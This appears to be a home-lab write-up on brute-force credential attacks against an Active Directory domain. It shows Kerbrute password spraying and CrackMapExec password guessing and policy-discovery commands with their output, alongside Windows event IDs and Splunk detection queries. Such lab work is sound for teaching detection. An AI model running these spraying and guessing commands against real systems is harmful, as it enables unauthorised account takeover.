# Brute Force Attacks

Two credential-access techniques were tested against the domain: password spraying (one password across many accounts) and password guessing (many passwords against one account).

## MITRE ATT&CK Mapping (TTPs)

| Tactic            | Technique                      | ID        |
| ----------------- | ------------------------------ | --------- |
| Credential Access | Brute Force: Password Spraying | T1110.003 |
| Credential Access | Brute Force: Password Guessing | T1110.001 |
| Discovery         | Password Policy Discovery      | T1201     |

The two techniques generate different events. Spraying via Kerbrute hits the Kerberos KDC and produces Event 4771, while guessing via CrackMapExec over SMB produces Event 4625 and, once the lockout threshold is reached, Event 4740.

## Recon: Password Policy Check (T1201)

Before spraying, the domain password policy was pulled using a known credential. This maps to Password Policy Discovery (T1201): an attacker checks the lockout settings to decide how aggressively they can spray without locking accounts.

```bash
crackmapexec smb 192.168.40.10 -u Administrator -p 'admin@123' --pass-pol
```

Key values returned:

- Minimum password length: 7
- Account Lockout Threshold: None (at the time of the spray)
- Lockout duration / reset counter: 30 minutes
- Password complexity: enabled

The lockout threshold being unset meant spraying could be done safely without locking accounts. A lockout policy was later enabled specifically for the guessing test to produce Event 4740.

Screenshot:

`01_password_policy_check.png`

 <img src="Screenshots/Pass spraying/01_password_policy_check.png" width="700">

## Password Spraying (T1110.003)

### Attack

A single common password (`Password@123`) was sprayed across a list of domain users (`users.txt`) using Kerbrute, which authenticates against the Kerberos KDC:

```bash
kerbrute passwordspray -d corp.local --dc 192.168.40.10 users.txt 'Password@123'
```

Kerbrute tested 5 logins and returned 3 valid credentials almost instantly:

```
[+] VALID LOGIN: alice.brown@corp.local:Password@123
[+] VALID LOGIN: finance.user@corp.local:Password@123
[+] VALID LOGIN: john.smith@corp.local:Password@123
Done! Tested 5 logins (3 successes) in 0.067 seconds
```

One of the valid credentials was then confirmed over SMB with CrackMapExec:

```bash
crackmapexec smb 192.168.40.10 -u 'john.smith' -p 'Password@123' -d corp.local
```

Result: `[+] corp.local\john.smith:Password@123`.

Screenshots: 

`02_kerbrute_spray_results.png`

<img src="Screenshots/Pass spraying/02_kerbrute_spray_results.png" width="700">

`03_CME_spray_creds_confirmed.png`

<img src="Screenshots/Pass spraying/03_CME_spray_creds_confirmed.png" width="700">


### Detection

**Event 4771 (Kerberos pre-authentication failed).** Because Kerbrute authenticates against the KDC, the failed attempts generated Event 4771, not 4625. The filtered Security log showed 9 of these events clustered within a few seconds. The detail view confirmed `ServiceName krbtgt/CORP.LOCAL`, `PreAuthType 2`, and the source `IpAddress 192.168.40.130` (the Kali host).

This is the key teaching point: a spray run through Kerberos shows up as 4771, so a detection that only watches 4625 would miss it entirely.

```spl
index=* EventCode=4771
| table _time, Account_Name
| sort -_time
```

This returned failures spread across several different accounts (Administrator, john.smith, finance.user, alice.brown) at near-identical timestamps, which is the signature of spraying.

Screenshots: 

`04_eventid_4771_spray_detected.png`

<img src="Screenshots/Pass spraying/04_eventid_4771_spray_detected.png" width="700">

 `05_eventid_4771_detail.png`

 <img src="Screenshots/Pass spraying/05_eventid_4771_detail.png" width="700">
 
 `06_splunk_spray_detected.png`

 <img src="Screenshots/Pass spraying/06_splunk_spray_detected.png" width="700">

## Password Guessing (T1110.001)

### Tooling note

The original plan was to use Hydra, but it failed against the domain controller because SMB signing was enabled on Windows Server 2022 (`signing:True`). CrackMapExec was used instead, since it handles SMB signing correctly. A default hardening control on Server 2022 broke a common attack tool, which is worth noting.

### Attack

A short password list (`passwords.txt`) was run against a single account (`john.smith`) over SMB:

```bash
crackmapexec smb 192.168.40.10 -u john.smith -p passwords.txt -d corp.local
```

Failed attempts returned `STATUS_LOGON_FAILURE`; the correct password was marked `[+]`:

```
[-] corp.local\john.smith:Summer2024! STATUS_LOGON_FAILURE
[-] corp.local\john.smith:Welcome1     STATUS_LOGON_FAILURE
[-] corp.local\john.smith:Admin123     STATUS_LOGON_FAILURE
[-] corp.local\john.smith:letmein      STATUS_LOGON_FAILURE
[-] corp.local\john.smith:Password1    STATUS_LOGON_FAILURE
[+] corp.local\john.smith:Password@123
```

### Detection

**Event 4625 (failed logon).** Each wrong password produced a 4625 on the DC. The detail showed the failed account (`john.smith`), `LogonType 3` (network), `AuthenticationPackageName NTLM`, source `IpAddress 192.168.40.130`, and `SubStatus 0xc000006a` (bad password).

**Event 4740 (account lockout).** With the lockout policy enabled for this test, repeated failures tripped a single 4740 for `john.smith` under User Account Management.

```spl
index=* (EventCode=4625 OR EventCode=4740)
| table _time, EventCode, Account_Name
| sort -_time
```

This showed the cluster of 4625 failures for one account followed by the 4740 lockout, all from the same source in a short window.

Screenshots: 

`01_CME_password_guessing.png`

<img src="Screenshots/Pass Guessing/01_CME_password_guessing.png" width="700">

`02_eventid_4625_guessing.png`

<img src="Screenshots/Pass Guessing/02_eventid_4625_guessing.png" width="700">


`03_eventid_4625_detail.png`

<img src="Screenshots/Pass Guessing/03_eventid_4625_detail.png" width="700">

`04_eventid_4740_account_lockout.png`

<img src="Screenshots/Pass Guessing/04_eventid_4740_account_lockout.png" width="700">  
  
`05_splunk_guessing_detected.png`

<img src="Screenshots/Pass Guessing/05_splunk_guessing_detected.png" width="700">

## Summary

| Technique                 | TTP       | Tool                      | Event ID   |
| ------------------------- | --------- | ------------------------- | ---------- |
| Password policy discovery | T1201     | CrackMapExec (--pass-pol) | —          |
| Spraying                  | T1110.003 | Kerbrute                  | 4771       |
| Guessing                  | T1110.001 | CrackMapExec (SMB)        | 4625, 4740 |

The contrast between spraying and guessing is the main lesson: the same tactic (Credential Access via Brute Force) leaves different fingerprints depending on the protocol used, so detection has to cover both the Kerberos (4771) and SMB/NTLM (4625) paths.